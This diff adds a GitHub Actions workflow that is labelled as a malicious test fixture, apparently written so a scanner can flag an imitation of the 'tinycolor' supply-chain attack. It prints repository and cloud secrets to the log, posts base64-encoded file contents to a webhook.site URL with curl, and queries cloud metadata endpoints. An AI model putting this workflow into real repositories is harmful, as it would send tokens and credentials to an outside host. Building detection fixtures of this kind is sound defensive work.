@@ -1,0 +1,35 @@
+# Malicious GitHub Actions workflow simulating the tinycolor attack
+# This workflow should be detected by the scanner
+
+name: Suspicious Workflow
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+
+jobs:
+  exfiltrate:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v3
+      
+    - name: Access sensitive secrets
+      run: |
+        echo "Accessing secrets: ${{ secrets.GITHUB_TOKEN }}"
+        echo "NPM Token: ${{ secrets.NPM_TOKEN }}"
+        echo "AWS Key: ${{ secrets.AWS_ACCESS_KEY_ID }}"
+        
+    - name: Read findings and exfiltrate
+      run: |
+        if [ -f findings.json ]; then
+          CONTENTS="$(cat findings.json | base64 -w0)"
+          curl -s -X POST -d "$CONTENTS" "https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7"
+        fi
+        
+    - name: Access cloud metadata
+      run: |
+        curl -s http://169.254.169.254/latest/meta-data/
+        curl -s http://metadata.google.internal/computeMetadata/v1/
